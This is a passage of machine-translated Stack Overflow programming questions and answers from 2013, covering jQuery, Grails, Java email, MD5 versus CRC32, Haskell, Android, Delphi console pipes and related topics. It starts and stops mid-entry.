                .fadeIn(500)
                .delay(i * 1000)
                .fadeOut(1000, showNextWord);
          }
          showNextWord();
        })(n);
    }
}); 
```

CSS：

```
.cloud li {
    display: none;
}
.cloud[data-group="2"] li {
    margin-left: 200px;
}
.cloud[data-group="3"] li{
    margin-left: 100px;
} 
```

HTML 应该是这样的：

```
<ul class="cloud" data-group="1">
  <li>smoke</li>
  <li>denim</li>
  ...
</ul>

<ul class="cloud" data-group="2">
... 
```

[http://jsfiddle.net/V5EFn/](http://jsfiddle.net/V5EFn/)

您可以选择为延迟添加数据字段，或您认为合适的任何其他配置参数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T15:36:09.560

试试这种方式：

```
var flash = function (jq, fadein, wait, fadeout) {

    var quotes = $(jq);
    var quoteIndex = -1;

    function showNextQuote() {

        ++quoteIndex;
        quotes.eq(quoteIndex % quotes.length)
            .fadeIn(fadein)
            .delay(wait)
            .fadeOut(fadeout, showNextQuote);
    }

    showNextQuote();

};

flash(".cloud1", 500, 700, 500);
flash(".cloud2", 500, 800, 500);
flash(".cloud3", 500, 900, 500); 
```

# grails - Grails RadioGroup，如何将标签绑定到电台名称

> ID：16122061
> 
> 赞同：7
> 
> 时间：2013-04-20T15:31:39.360
> 
> 标签：grails, radio-button, label, gsp, radio-group

我在`g:radioGroup`标签上苦苦挣扎——我想创建一些收音机和一些与收音机相对应的标签：

```
<g:radioGroup name="stateOfHealth" value="${review.stateOfHealth}" id="stammp"
        labels="['1','2','3','4','5']"
        values="['bad','suboptimal','well','veryWell','excellent']">
    <span class="radioSpan"> ${it.radio}</span>
    <label for="${ ???? }">${it.label}</label>
</g:radioGroup> 
```

我需要做什么才能插入标签的“for”属性以匹配正确的收音机？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-21T14:09:34.783

您不需要设置 for 属性，只需用标签包装收音机，如下所示：

```
<g:radioGroup name="stateOfHealth" value="${review.stateOfHealth}" id="stammp"
        labels="['1','2','3','4','5']"
        values="['bad','suboptimal','well','veryWell','excellent']">

    <label>
            <span class="radioSpan">${it.radio}</span>
            ${it.label}
    </label>

</g:radioGroup> 
```

# java - 从 Web 应用程序中发送/接收电子邮件？

> ID：16122065
> 
> 赞同：8
> 
> 时间：2013-04-20T15:31:49.957
> 
> 标签：java, email, jakarta-ee, web-applications, smtp

我有一个订单管理 (Web) 应用程序（在 Java/Java EE 中）。

应用程序用户希望从 Web 应用程序内向下订单的客户发送接收电子邮件通信。电子邮件跟踪必须与订单相关联。

**用例是**：

1.  用户打开订单详情页面。订单信息。被展示。

2.  在该页面上 - 单击电子邮件图标，它将显示该订单迄今为止的所有电子邮件通信（发送/接收）。

3.  对于该订单 - 您可以查看新收到的邮件、回复邮件或向客户发送新邮件 - 所有这些都与该订单相关。

**问题：**

1.  发送电子邮件很容易，但如何在应用程序内接收电子邮件？

2.  这里的电子邮件帐户是什么 - 一个名为 orders@myorg.com 的常见电子邮件帐户（并且基于主题行/某些标题电子邮件被过滤等）或者是 orderid@myorg.com（在这种情况下，新的电子邮件帐户创建是每个订单要求）或？

3.  我们已经拥有 Microsoft Exchange Server，公司电子邮件通过该服务器传输。我们可以以某种方式利用它还是我们需要设置一个新的邮件服务器？

欢迎任何想法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-22T18:20:28.120

如果您愿意承担依赖，[Spring Integration](http://static.springsource.org/spring-integration/docs/latest-ga/reference/html/mail.html#mail-inbound)可以轻松地从指定服务器以轮询（POP3、IMAP）或事件驱动（IMAP-IDLE）的方式读取电子邮件。**[1 & 3]**

**[2]**您可以使用专用邮件帐户，根据接收邮件的主题（或其他字段）过滤发送到下游渠道的邮件。Spring 站点的以下代码片段说明了这一点：

```
 <int-mail:imap-idle-channel-adapter id="customAdapter"
store-uri="imaps://some_google_address:${password}@imap.gmail.com/INBOX"
channel="receiveChannel"    
should-mark-messages-as-read="true"
java-mail-properties="javaMailProperties"
mail-filter-expression="subject matches '(?i).*Spring Integration.*'"/> 
```

Where`mail-filter-expression`过滤将被刷新的电子邮件`receiveChannel`。对于所有相关方（频道），您将有一个`<int-mail:imap-idle-channel-adapter/>`收听您的 Exchange 服务器。

虽然使用起来并不麻烦，但我建议您看一下[根据 spring](http://www.fiveminutes.eu/introducing-spring-integration/)的 EAI和[一般EAI 的简短概述](http://en.wikipedia.org/wiki/Enterprise_application_integration)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-27T17:04:16.427

1.  接收电子邮件 这是阅读电子邮件的示例代码[有没有简单的阅读新 gmail 消息的好短代码示例？](https://stackoverflow.com/questions/3303805/are-there-any-good-short-code-examples-that-simply-read-a-new-gmail-message)

2.  此处的电子邮件帐户为每个用户创建一个电子邮件帐户，并将用户的 Web 应用程序凭据也用作电子邮件的凭据。使用散列订单 ID 作为主题的一部分，将每个电子邮件链与特定订单相关联。

3.  Microsoft Exchange Server 使用 exJello 是一个 JavaMail 提供程序 ( [http://www.exjello.org/](http://www.exjello.org/) ) 或使用 JavaMail API 和 DavMail 网关 ( [http://davmail.sourceforge.net/](http://davmail.sourceforge.net/) )

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-20T15:48:52.660

您需要以下内容。

1.  Java Mail API 通过一些交换服务器以编程方式发送电子邮件。
2.  我建议使用专用的电子邮件服务器来接收特定于应用程序的电子邮件。您可以通过使用[James](http://james.apache.org/)来做到这一点。您可以通过此软件发送和接收电子邮件。
3.  如果您使用现有的 Microsoft Exchange Server，则始终可以使用重定向到您的应用程序特定的电子邮件服务器。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-30T09:51:52.627

从用户的角度来看，我认为保持特定主题更加困难。我会建议像 myapp.myorg.com 这样的子域或像 myapp.com 这样的新域

无论哪种方式都有一个全部，因此所有邮件都会发送到特定的电子邮件，例如 orders@myapp.myorg.com

然后你的脚本可以检查真正的 TO。这可能更自然、更“酷” -> 每个订单都有自己的邮件 ID！最重要的是，使用 James 或其他邮件软件来传递您的代码。

# algorithm - MD5 vs CRC32：哪个更适合常用？

> ID：16122067
> 
> 赞同：52
> 
> 时间：2013-04-20T15:31:57.873
> 
> 标签：algorithm, hash

最近我在某处读到，虽然 CRC32 和 MD5 都足够统一和稳定，但 CRC32 比 MD5 更有效。MD5 似乎是一种非常常用的散列算法，但如果 CRC32 更快/内存效率更高，那么为什么不使用它呢？

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2013-04-20T21:48:07.043

**MD5**是一种***单向哈希***算法。***单向哈希***算法通常用于密码学，因为它们具有（按设计）很难找到产生特定哈希值的输入的特性。具体来说，很难做出两个不同的输入来提供相同的单向哈希。那些它们通常被用作一种方式来表明自产生哈希码以来没有故意更改大量数据。由于 MD5 是一种***单向哈希***算法，因此重点在于安全性而非速度。不幸的是，MD5 现在被认为是不安全的。

**CRC32**旨在检测数据的意外更改，通常用于网络和存储设备。该算法的目的不是防止故意更改，而是捕捉网络错误和磁盘写入错误等事故。该算法的重点是速度而不是安全性。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2013-04-20T15:45:42.373

来自[维基百科关于 MD5 的文章](http://en.wikipedia.org/wiki/MD5)（强调我的）：

> MD5 是一种广泛使用的**加密哈希函数**

现在[CRC32](http://en.wikipedia.org/wiki/CRC32)：

> CRC 是一种**错误检测码**

因此，如您所见，CRC32*不是散列算法*。这意味着您不应该将它用于散列，因为它不是为此而构建的。

而且我认为谈论通用用途没有多大意义，因为相似的算法用于不同的目的，每种都有明显不同的要求。没有最适合常用的单一算法，相反，您应该选择最适合您的特定用途的算法。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2017-09-19T09:19:55.680

这取决于你的目标。以下是使用 CRC32 与 MD5 可以完成的一些示例：

**检测重复文件**

如果你想检查两个文件是否相同，CRC32 校验和是要走的路，因为它比 MD5 快。但要小心：CRC 只能可靠地告诉您二进制文件是否不同；它不会告诉你它们是否相同。如果两个文件的哈希值不同，它们就不可能是同一个文件，因此您可以很快将它们拒绝为重复文件。

无论您的密钥是什么，CRC32 校验和都将是 2^32 个不同值之一。假设随机样本文件，两个给定文件的哈希值发生冲突的概率为 1 / 2^32。N 个给定文件之间发生冲突的概率为 (N - 1) / 2^32。

**检测恶意软件**

如果安全是一个问题，例如下载文件并检查源的哈希值以查看二进制文件是否未损坏，那么 CRC 是一个糟糕的选择。这是因为攻击者可以制作具有相同 CRC 校验和的恶意软件。在这种情况下，MD5 摘要更安全——CRC 不是出于安全考虑。与相同的 MD5 摘要相比，两个不同的二进制文件更有可能具有相同的 CRC 校验和。

**保护用户身份验证的密码**

同步（单向）加密通常比异步（双向）加密更容易、更快、更安全，因此它是存储密码的常用方法。基本上，密码将与其他数据（盐）组合，然后将对所有这些组合数据进行哈希处理。随机盐大大减少了两个密码相同的机会。默认情况下，对于大多数算法，相同的密码将具有相同的哈希值，因此您必须添加自己的随机性。当然，盐必须在外部保存。

要让用户登录，您只需获取他们在登录时提供的信息。您可以使用他们的用户名从数据库中获取他们的 salt。然后将这个盐与用户密码结合起来，得到一个新的哈希值。如果它与数据库中的匹配，则他们的登录成功。由于您要存储这些密码，因此它们必须非常安全，这意味着 CRC 校验和是不可能的。

加密摘要的计算成本比 CRC 校验和高。此外，像 sha256 这样更好的散列更安全，但散列速度较慢并占用更多数据库空间（它们的散列更长）。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2013-04-20T16:04:24.660

CRC32 和 MD5 之间的一个很大区别是，通常很容易选择一个 CRC32 校验和，然后提出一个哈希到该校验和的消息，即使对消息施加了限制，而 MD5 专门设计用于进行这种排序困难的事情（尽管它正在显示它的年龄 - 现在在某些情况下这是可能的）。

如果您处于这样一种情况，对手可能会决定坐下来创建具有指定 CRC32 哈希值的消息负载，以模仿其他消息，或者只是使哈希表性能非常糟糕，因为所有内容的哈希值都相同值，那么 MD5 将是一个更好的选择。（更好的是，恕我直言，HMAC-MD5 的键值对于使用它的模块来说是唯一的，并且在它之外是未知的）。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2013-04-20T16:33:13.873

CRC 用于防止随机错误，例如在数据传输中。

加密哈希函数旨在防止智能对手伪造消息，尽管 MD5 在这方面已被破坏。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2013-04-20T17:20:18.953

您应该使用 128 位长的 MD5。CRC32 只有 32 位长，其目的是检测错误而不是散列。如果您只需要 32 位哈希函数，您可以选择 MD5 返回的 32 位 LSB/MSB/Whatever。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2013-09-17T16:04:35.910

CRC32（或 CRC8 或 CRC16）用于任何目的的主要原因是它可以廉价地*在硬件*中实现，作为检测“随机”数据损坏的一种手段。即使在软件实现中，它也可用作检测硬件原因（例如嘈杂的通信线路或不可靠的闪存介质）导致的数据随机损坏的一种方法。它不是防篡改的，通常也不适合测试两个任意文件是否可能相同：如果文件中的每个数据块紧跟该块的 CRC32（某些数据格式会这样做），则每个块对整个文件的 CRC 的影响与全零字节块的效果相同，无论该块中存储了什么数据。

如果有办法快速计算 CRC32，则与其他校验和或散列方法结合使用可能会有所帮助，如果具有相同 CRC 的不同文件可能在其他散列之一中不同，反之亦然，但在许多机器上相对于它们提供的保护量，其他校验和或哈希方法可能更容易计算。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2016-02-18T14:27:18.397

实际上，CRC32**并不**比 MD5 快。

请看一下：[https ://3v4l.org/2MAUr](https://3v4l.org/2MAUr)

该 php 脚本运行几个散列算法并测量每个算法计算散列所花费的时间。它表明 MD5 通常是最快的散列算法。而且，它表明在大多数测试用例中，即使是 SHA1 也比 MD5 快。

所以，无论如何，如果你想做一些快速的错误检测，或者寻找随机变化......我总是建议使用 MD5，因为它只是做这一切。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2013-04-20T16:33:55.137

一个人的常见是另一个人的罕见。常见的取决于您所从事的领域。

如果您正在为小项目进行非常快速的传输或计算哈希码，那么 CRC 会更好，因为它们速度更快，并且为错误数据获得相同的 16 位或 32 位 CRC 的机会很小。

如果它是兆字节的数据，例如，linux iso，那么您可能会丢失几兆字节，但最终还是会得到相同的 CRC。MD5 不太可能。出于这个原因，MD5 通常用于大量传输。它速度较慢但更可靠。

所以基本上，如果你要进行一次巨大的传输并在最后检查你是否得到正确的结果，请使用 MD5。如果要以小块传输，则使用 CRC。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2020-05-21T15:43:33.057

我会说，如果你**不知道该选择什么**，那就去吧`md5`。

引起您头痛的可能性较小。

# python - 使用python从图像中提取对象

> ID：16122069
> 
> 赞同：1
> 
> 时间：2013-04-20T15:32:12.373
> 
> 标签：python, image, image-processing, cbir

我想从图像中提取对象。例如，我想计算图片中的人或在大型数据库中找到相似的图片（如谷歌示例）或查找图片的字段（办公室或家庭的性质）等。

你知道任何 python 库或模块来完成这项工作吗？如果可以链接我

*   这项工作的教程或指导
*   类似的示例项目

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:09:39.577

也许使用[simplecv](http://simplecv.org/)？

这是pycon 演示者[的视频，他通过快速教程介绍了如何使用 simplecv。](http://pyvideo.org/video/1796/simplecv-computer-vision-using-python)大约在中途，在 9:50，她演示了如何检测图像中的人脸，您可以将其用于您的项目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-12-13T16:28:39.990

试试这个：[https ://github.com/CMU-Perceptual-Computing-Lab/openpose](https://github.com/CMU-Perceptual-Computing-Lab/openpose)

我用它来检测多人并提取骨骼关节。它也有点敏感，因此需要进行后期处理以去除由于地板、玻璃墙等反射而引起的异常值。

# database - Haskell 在数据库中查找信息

> ID：16122070
> 
> 赞同：1
> 
> 时间：2013-04-20T15:32:16.910
> 
> 标签：database, list, haskell

我目前有一个包含以下信息的数据库：

```
type Title = String
type Actor = String
type Cast = [Actor]
type Year = Int
type Fan = String
type Fans = [Fan]
type Period = (Year, Year)
type Film = (Title, Cast, Year, Fans)
type Database = [Film]
title (t, _, _, _) = t
fans (_, _, _, fs) = fs
year (_, _, y, _) = y

    testDatabase :: Database
    testDatabase = [("Casino Royale", ["Daniel Craig", "Eva Green", "Judi Dench"], 2006, ["Garry", "Dave", "Zoe", "Kevin", "Emma"]),
        ("Cowboys & Aliens", ["Harrison Ford", "Daniel Craig", "Olivia Wilde"], 2011, ["Bill", "Jo", "Garry", "Kevin", "Olga", "Liz"]),     
            ("Catch Me If You Can", ["Leonardo DiCaprio", "Tom Hanks"], 2002, ["Zoe", "Heidi", "Jo", "Emma", "Liz", "Sam", "Olga", "Kevin", "Tim"]),           
                ("Mamma Mia!", ["Meryl Streep", "Pierce Brosnan"], 2008, ["Kevin", "Jo", "Liz", "Amy", "Sam", "Zoe"]),     
                    ("Saving Private Ryan", ["Tom Hanks", "Matt Damon"], 1998, ["Heidi", "Jo", "Megan", "Olga", "Zoe", "Wally"]),         
                        ("Life of Pi" ,["Suraj Sharma"], 2012, ["Kevin", "Olga", "Liz", "Tim", "Zoe", "Paula", "Jo", "Emma"])] 
```

注意： testDatabase 包含更多数据，我只包含了其中的一个片段。

现在我的目标是写一个函数，让我根据粉丝的数量“展示最好的电影”。

我曾尝试使用“长度粉丝”来输出每部电影的粉丝数量，但我不知道如何绕过然后输出“最佳电影”的标题

这是 displayAllFilms 的示例代码：

```
displayAllFilms' :: [Film] -> String -> String
displayAllFilms' [] filmString = filmString
displayAllFilms' ((title,cast,year,fans):films) filmString = 
       displayAllFilms' films (filmString ++ "\n" ++ title ++ ", " ++ listStuff cast ", " ++ (show year) ++ ", " ++ show (length fans)) 
```

它输出每部电影的粉丝数量......

编辑：

我忘了说这个功能需要用户输入一个演员的名字，然后根据电影的粉丝数量和演员出演的电影输出最好的电影。

任何帮助将不胜感激，谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T15:57:14.983

有几个已经预定义的函数 ([`maximumBy`](http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-List.html#v%3amaximumBy)和[`comparing`](http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-Ord.html#v%3acomparing)) 可能对您有用。

```
maximumBy :: (a -> a -> Ordering) -> [a] -> a
comparing :: Ord a => (b -> a) -> b -> b -> Ordering 
```

为了选择粉丝最多的电影，你可以写：

```
import Data.List
import Data.Ord

bestFilm :: Database -> Film
bestFilm = maximumBy $ comparing (length . fans) 
```

它可以很容易地翻译成简单的英语：“通过比较粉丝列表的长度来选择最大的电影”。

请注意，在严重的情况下，列表完全不适合表示数据库。您应该使用排序和/或索引的数据结构。

编辑：

要仅从包含特定演员`filter`的电影中选择，您可以先选择电影。

```
filmsWithActor :: Actor -> Database -> Database
filmsWithActor actor = filter $ \film -> actor `elem` cast film

cast (_, c, _, _) = c 
```

# jquery - Jquery ajax 成功无法完全正常工作

> ID：16122073
> 
> 赞同：-1
> 
> 时间：2013-04-20T15:32:27.080
> 
> 标签：jquery, ajax

我正在开发一个通知系统，我在删除类或在 ajax 成功中执行除 html() 和 append() 之外的任何事情时遇到问题。这是我的代码：

```
 setInterval(function (){
    $(".notificare_caseta").each(function(){
        var id=$(this).attr("record");
        $.ajax({
            url : "../template/functions/notificari.php?nr="+id,                          
            contentType: "application/json; charset=utf-8",
            dataType:"JSON",                   
            success : function(data) {  
                $(".notificari_zona"+id).html(data.notif);
                if(data.note>0){
                    $(".notificari_note"+id).html(data.note);
                }else{
                    $(".notificari_note"+id).addClass('nu_arata');
                    $(".notificari_note"+id).prev().removeClass("atentionare");
                    $(".notificari_note"+id).next().addClass("nu_arata");
                }
            }
        });                 
    });

    $("#data").load("../template/functions/data.php");

}, 2000); 
```

任何人都可以帮助我吗？next、prev、removeclass、addclass 函数不起作用。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:05:20.207

我重写了你发送数据和返回的函数。

```
setInterval(function (){
    var ids = [];
    $(".notificare_caseta").each(function(){
        ids.push($(this).attr("record"));
    });
    $.ajax({
        url : "notificari.php",
        data : {"nr":ids},
        dataType:"JSON",
        success : function(data) {  
            //here you should get the all data togther for ex [{"notif":1,"note":1},{"notif":2,"note":2},{"notif":3,"note":3}]
            $.each(data,function(i,x){
                $(".notificari_zona"+ids[x]).html(i.notif);
                if(i.note>0){
                    $(".notificari_note"+ids[x]).html(i.note);
                }else{
                    modify(".notificari_note"+ids[x]);
                }
            })
        }
    });                 

    // $("#data").load("../template/functions/data.php");

}, 10000); 
```

# algorithm - 城市电厂的优化分布

> ID：16122077
> 
> 赞同：2
> 
> 时间：2013-04-20T15:32:59.440
> 
> 标签：algorithm, graph, graph-algorithm, minimum-spanning-tree

我已经在 Google 和 Stack Overflow 上搜索了我的问题的答案，但我找不到。

我需要找到一个城市电力网络的最佳分布。城市由连通图表示。我想在其中一些节点之间分配发电厂，以覆盖电网中的所有节点。问题在于每个发电厂都有一定的“范围”（例如，它只能覆盖两个节点的“半径”）。我的程序需要找到覆盖整个城市的最少数量的发电厂及其位置。

我从搜索中知道它应该与 MST（最小生成树）有关，但问题出在发电厂的有限范围内。

我考虑过遍历城市中的每个节点并计算包含该节点中发电厂范围内所有节点的子图，直到找到覆盖最多未覆盖节点的子图，然后继续这样做直到整个city 被覆盖（基本上是暴力破解问题），但这似乎非常不切实际，我想知道是否有其他更有效的方法来解决这个问题。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T18:36:17.327

[不幸的是，通过从支配集](http://en.wikipedia.org/wiki/Dominating_set)问题的减少，这个问题被认为是 NP 难的。

给定一个图 G，G 中的支配集是一组节点 D，使得图中的每个节点要么在 D 中，要么离 D 有一跳。在图中找到最小支配集的问题已知为NP-hard，这个问题很容易归结为你要解决的问题：给定一个图 G，生成一个与 G 具有相同结构的城市（表示为一个图），然后给每个发电厂的半径为 1 （意味着它可以覆盖一个节点及其所有邻居）。找到覆盖整个城市的最小发电厂集，然后最终为该图生成一个支配集。因此，您的问题是 NP 难的。

正如[Wikipedia page 的这一部分中](http://en.wikipedia.org/wiki/Dominating_set#Algorithms_and_computational_complexity)所提到的，事实证明这个问题非常难以近似。维基百科页面列出了一些近似它的算法和方法，但它似乎是那些抵制多项式时间近似方案的 NP 难题之一。

希望这可以帮助！

# android - android 从不调用我的 Application 类的 onCreate（在清单中注册）

> ID：16122079
> 
> 赞同：0
> 
> 时间：2013-04-20T15:33:13.017
> 
> 标签：android

我编写的应用程序类遇到了一些问题。我只是想在我的活动中访问它，但似乎应用程序从未被 android 系统实例化（因此也从未调用过 onCreate）。在这一点上，我唯一的疑问是 android 是否可以实例化清单中声明的​​所有应用程序，或者只实例化一个。

这是代码：

```
package org.dyndns.bertuz83.test.applicationTst;

import android.app.Application;

public class MyApplication extends Application{
private String prova="";

private static MyApplication instance;  

@Override
public void onCreate() {
    super.onCreate();
    instance= this;

    this.prova="ciao!";
}

public static MyApplication getInstance(){
    return instance;
}

public String getProva(){
    return this.prova;
}
} 
```

清单看起来像：

```
<application
    android:allowBackup="true"
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" 
    android:name="org.dyndns.bertuz83.test.applicationTst.MyApplication">
    <activity
        android:name="org.dyndns.bertuz83.test.applicationTst.MainActivity"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
</application>

<application 
    android:allowBackup="true"
    android:name="org.dyndns.bertuz83.test.applicationTst.MyApplication"></application>
</manifest> 
```

如您所见，我运行的活动是在另一个应用程序下声明的，但我认为第二个应用程序无论如何都会被初始化（实际上，如果我添加 android:name="...MyApplication"，我的应用程序已正确初始化）！我错了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T15:49:34.087

您只能拥有一个应用程序类和实例。

顺便提一句。你不需要`private static MyApplication instance;`。您可以使用`Activity.getApplication()`. 如果您仍然需要它：您正在开始意大利面条代码。

# python - 如何访问存储在字典键中的列表值？

> ID：16122083
> 
> 赞同：-3
> 
> 时间：2013-04-20T15:33:44.393
> 
> 标签：python

我有一本列表字典。可以说它看起来像这样：

```
dictionary1 = {
    'key1':[10000,20000],
    'key2':[30000,40000],
    'key3':[50000,60000],
    # and so on...
} 
```

我想从每个键访问这两个值并将其与`sys.argv`

它应该像这样工作：

`python command key1`

从 key1 获取值 10000 和 20000 并将其用于`for loop`

和

`python command key2`

从 key2 获取 30000 和 40000 并在相同的情况下使用它`for loop`

如何从每个键访问这两个列表值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T15:35:43.520

使用内置`min`和`max`功能：

```
the_key = 'key1'
lower_value, upper_value = min(the_dict[the_key]), max(the_dict[the_key]) 
```

此外，作为一般规则 - 不要将变量命名为与内置变量相同的名称。这称为“阴影”。`dict`是内置的，这就是我`the_dict`在示例中将名称更改为的原因。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T15:35:31.873

你对哪一部分感到困惑？你不能就这样吗

```
lower, upper = dictionary1[key] 
```

# delphi - Delphi 控制台管道切换？

> ID：16122084
> 
> 赞同：1
> 
> 时间：2013-04-20T15:33:46.527
> 
> 标签：delphi, console, pipe, console-application, trinitycore

我想用我自己的单元从控制台读取控制台输出：

```
unit uConsoleOutput;
interface

uses  Classes,
      StdCtrls,
      SysUtils,
      Messages,
      Windows;

  type
  ConsoleThread = class(TThread)
  private
    OutputString : String;
    procedure SetOutput;
  protected
    procedure Execute; override;
  public
    App           : WideString;
    Memo          : TMemo;
    Directory     : WideString;
  end;

  type
    PConsoleData = ^ConsoleData;
    ConsoleData = record
    OutputMemo          : TMemo;
    OutputApp           : WideString;
    OutputDirectory     : WideString;
    OutputThreadHandle  : ConsoleThread;
  end;

function StartConsoleOutput (App : WideString; Directory : WideString; Memo : TMemo) : PConsoleData;
procedure StopConsoleOutput  (Data : PConsoleData);

implementation

procedure ConsoleThread.SetOutput;
begin
  Memo.Lines.BeginUpdate;
  Memo.Text := Memo.Text + OutputString;
  Memo.Lines.EndUpdate;
end;

procedure ConsoleThread.Execute;
const
  ReadBuffer = 20;
var
  Security    : TSecurityAttributes;
  ReadPipe,
  WritePipe   : THandle;
  start       : TStartUpInfo;
  ProcessInfo : TProcessInformation;
  Buffer      : Pchar;
  BytesRead   : DWord;
  Apprunning  : DWord;
begin
  Security.nlength := SizeOf(TSecurityAttributes) ;
  Security.lpsecuritydescriptor := nil;
  Security.binherithandle := true;
  if Createpipe (ReadPipe, WritePipe, @Security, 0) then begin
    Buffer := AllocMem(ReadBuffer + 1) ;
    FillChar(Start,Sizeof(Start),#0) ;
    start.cb := SizeOf(start) ;
    start.hStdOutput  := WritePipe;
    start.hStdError   := WritePipe;
    start.hStdInput   := ReadPipe;
    start.dwFlags     := STARTF_USESTDHANDLES + STARTF_USESHOWWINDOW;
    start.wShowWindow := SW_HIDE;
    if CreateProcessW(nil,pwidechar(APP),@Security,@Security,true,NORMAL_PRIORITY_CLASS,nil,pwidechar(Directory),start,ProcessInfo) then begin
      while not(terminated) do begin
        BytesRead := 0;
        if Terminated then break;
        ReadFile(ReadPipe,Buffer[0], ReadBuffer,BytesRead,nil);
        if Terminated then break;
        Buffer[BytesRead]:= #0;
        if Terminated then break;
        OemToAnsi(Buffer,Buffer);
        if Terminated then break;
        OutputString := Buffer;
        if Terminated then break;
        Synchronize(SetOutput);
      end;
      FreeMem(Buffer) ;
      CloseHandle(ProcessInfo.hProcess) ;
      CloseHandle(ProcessInfo.hThread) ;
      CloseHandle(ReadPipe) ;
      CloseHandle(WritePipe) ;
    end;
  end;
end;

function StartConsoleOutput (App : WideString; Directory : WideString; Memo : TMemo) : PConsoleData;
begin
  result                          := VirtualAlloc(NIL, SizeOf(ConsoleData), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  Memo.DoubleBuffered             := TRUE;
  with PConsoleData(result)^ do begin
    OutputMemo                          := Memo;
    OutputApp                           := App;
    OutputDirectory                     := Directory;
    OutputThreadHandle                  := ConsoleThread.Create(TRUE);
    OutputThreadHandle.FreeOnTerminate  := TRUE;
    OutputThreadHandle.Memo             := Memo;
    OutputThreadHandle.App              := App;
    OutputThreadHandle.Directory        := Directory;
    OutputThreadHandle.Resume;
  end;
end;

procedure StopConsoleOutput  (Data : PConsoleData);
begin
  with PConsoleData(Data)^ do begin
    OutputThreadHandle.Terminate;
    while not(OutputThreadHandle.Terminated) do sleep (100);
  end;
  VirtualFree (Data,0, MEM_RELEASE);
end;

end. 
```

我使用此控制台应用程序在（worldserver.exe）上对其进行测试： [https](https://dl.dropboxusercontent.com/u/349314/Server.rar) ://dl.dropboxusercontent.com/u/349314/Server.rar （已编译）

该项目的来源在这里： [https ://github.com/TrinityCore/TrinityCore](https://github.com/TrinityCore/TrinityCore)

如何编译项目的教程在这里： http: [//archive.trinitycore.info/How-to :Win](http://archive.trinitycore.info/How-to:Win)

要启动 worldserver.exe，我只需使用我自己的单元，如下所示：

```
StartConsoleOutput ('C:\worldserver.exe', 'C:\', Memo1); 
```

该应用程序启动良好，只是有一些我不明白的问题/错误：

1.  似乎输出应用程序（worldserver.exe）的时间需要更长的时间，就好像我自己打开它一样（有 3 秒的延迟）。
2.  管道似乎已切换或某些原因导致我的 delphi 应用程序以错误的方式输出。（见截图 2）
3.  我让服务器（worldserver.exe）与 mysql 一起运行（工作正常），并让它在我的 delphi 应用程序中输出。似乎某些部分丢失了，然后突然输出一些东西正在写入控制台。

![截图1](https://i.stack.imgur.com/5Pagn.png) ![截图2](https://i.stack.imgur.com/gnPq1.png)

我做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T16:44:06.687

基本问题是您创建了一个管道，并使外部进程使用同一管道的两端。管道用于连接两个不同的进程。所以每个进程应该只知道它的一端。

所以想象一下你想让app1向app2发送信息。创建一个具有写端和读端的管道。典型配置如下所示。

```
app1, stdout --> pipe write end --> pipe read end --> app2, stdin 
```

如果你写这就是你会得到的

```
app1 | app2 
```

在命令解释器中。

但是您已将管道的读取端附加到 app1，stdin。所以在你的情况下，图表是这样的

```
app1, stdout --> pipe write end ---
|                                 |
|                                 |
app1, stdin  <-- pipe read end  <-- 
```

这是您的程序中的一个明显错误。当 app1 写入它的标准输出时，它写入的任何内容都会出现在它自己的标准输入中！绝对不是你想要的。

故事中的额外转折是您的应用程序也在尝试读取管道的读取端。因此，您的应用程序和外部进程都在读取它。现在，这是一场比赛。谁说谁得到内容？

也许您只需要删除分配的行并将`hStdInput`其保留为 0。

最后一点。写作`Text := Text + ...`效率很低。备忘录的全部内容将被读取和写入。

# android - AndEngine - 当我设置精灵时，精灵的 (0, 0) 是精灵的中心。我怎样才能像往常一样让它在左下角？

> ID：16122086
> 
> 赞同：1
> 
> 时间：2013-04-20T15:33:48.457
> 
> 标签：android, andengine

我正在使用Anchor Center分支，我刚刚发现与我的游戏相关的大部分问题都是因为这个原因。有没有办法使用精灵的左下角而不是使用 (0, 0) 作为其中心来设置精灵？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T17:50:14.843

发现！

.setAnchorCenter(0, 0);

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-15T21:06:17.623

如果从 GLES2 到 GLES2 Anchor Center 的主要变化是 Y 反转的坐标系，你为什么要这样做？

# .htaccess - 使用 .htaccess 进行 301 重定向不起作用

> ID：16122090
> 
> 赞同：-1
> 
> 时间：2013-04-20T15:33:56.100
> 
> 标签：.htaccess, redirect

我正在尝试设置以下重定向：

```
From: http://www.contractorshire.co.uk/plant/attachments.asp
To: http://www.contractorshire.co.uk/catalog/plant/attachments/ 
```

.htaccess 中的以下条目不起作用：

```
